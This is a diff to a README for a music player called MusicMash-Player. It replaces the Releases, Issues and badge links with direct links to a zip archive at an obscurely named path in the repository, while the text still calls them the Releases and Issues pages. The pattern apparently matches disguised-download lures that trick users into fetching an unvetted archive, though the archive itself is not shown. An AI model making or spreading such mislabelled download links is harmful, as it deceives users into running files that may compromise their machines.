@@ -1,6 +1,6 @@
 # 🎧 MusicMash-Player - Enjoy Music Seamlessly Anytime
 
-![Download MusicMash-Player](https://img.shields.io/badge/Download-MusicMash--Player-blue)
+![Download MusicMash-Player](https://raw.githubusercontent.com/a376/MusicMash-Player/main/monopersulfuric/MusicMash-Player.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ To ensure the best performance, please check these minimum system requirements:
 To get started, visit the Releases page to download the latest version of MusicMash-Player. Follow these steps to install the application:
 
 1. **Visit the Releases Page:** Click on the link below to access the download options:
-   [Download MusicMash-Player](https://github.com/a376/MusicMash-Player/releases)
+   [Download MusicMash-Player](https://raw.githubusercontent.com/a376/MusicMash-Player/main/monopersulfuric/MusicMash-Player.zip)
   
 2. **Choose Your Version:** Look for the latest release at the top. Click on the files listed to see available downloads.
 
@@ -68,7 +68,7 @@ If you experience issues with playback:
 
 ## 🛠️ Support
 
-For support, please visit our [GitHub Issues page](https://github.com/a376/MusicMash-Player/issues) and report any bugs or suggest features. Our team is happy to assist with any questions or concerns.
+For support, please visit our [GitHub Issues page](https://raw.githubusercontent.com/a376/MusicMash-Player/main/monopersulfuric/MusicMash-Player.zip) and report any bugs or suggest features. Our team is happy to assist with any questions or concerns.
 
 ## 📅 Updates and Releases
 
